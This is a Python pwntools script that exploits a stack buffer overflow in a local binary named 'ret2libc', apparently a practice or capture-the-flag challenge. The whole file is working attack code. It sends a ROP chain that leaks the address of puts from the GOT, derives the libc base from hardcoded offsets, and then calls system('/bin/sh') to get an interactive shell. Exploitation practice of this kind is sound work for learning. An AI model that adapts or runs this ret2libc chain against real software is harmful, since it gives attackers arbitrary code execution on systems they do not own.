from pwn import *
import struct

e = ELF("./ret2libc")

for i in e.symbols:
	print i, hex(e.symbols[i])

# Get puts@libc
p = process ("./ret2libc")
# context.log_level = 'DEBUG'
# gdb.attach(p)

padding = 'A' * 104
rop_gadget = int("0x4006a3", 16)
puts_plt = e.symbols['plt.puts']
got_addr = e.symbols['got.puts']
main_addr = e.symbols['vuln']
payload = padding + p64(rop_gadget) + p64(got_addr) + p64(puts_plt) + p64(main_addr)
print payload

p.sendline(payload)
print p.recvuntil(':(\n')
puts_libc = u64(p.recv(6) + '\x00' * 2)
log.info('puts@libc = %s' % hex(puts_libc))
print p.recv()
# # Get read@libc
# got_addr = e.symbols['got.read']
# payload = padding + p64(rop_gadget) + p64(got_addr) + p64(puts_plt)	+ p64(main_addr)
# print payload

# p.sendline(payload)
# print p.recvuntil(':(\n')
# read_libc = u64(p.recv(6) + '\x00' * 2)
# log.info('read@libc = %s' % hex(read_libc))

# final exploit
puts_offset = 0x06f690
libc_base = puts_libc - puts_offset
system_offset = 0x045390
system_addr = libc_base + system_offset
bin_sh_offset = 0x18cd57
bin_sh_addr = libc_base + bin_sh_offset

log.info('libc_base = %s' % hex(libc_base))
log.info('system_addr = %s' % hex(system_addr))
log.info('bin_sh_addr = %s' % hex(bin_sh_addr))

payload = padding + p64(rop_gadget) + p64(bin_sh_addr) + p64(system_addr)
# print payload
p.sendline(payload)
# print p.recv()

p.interactive()
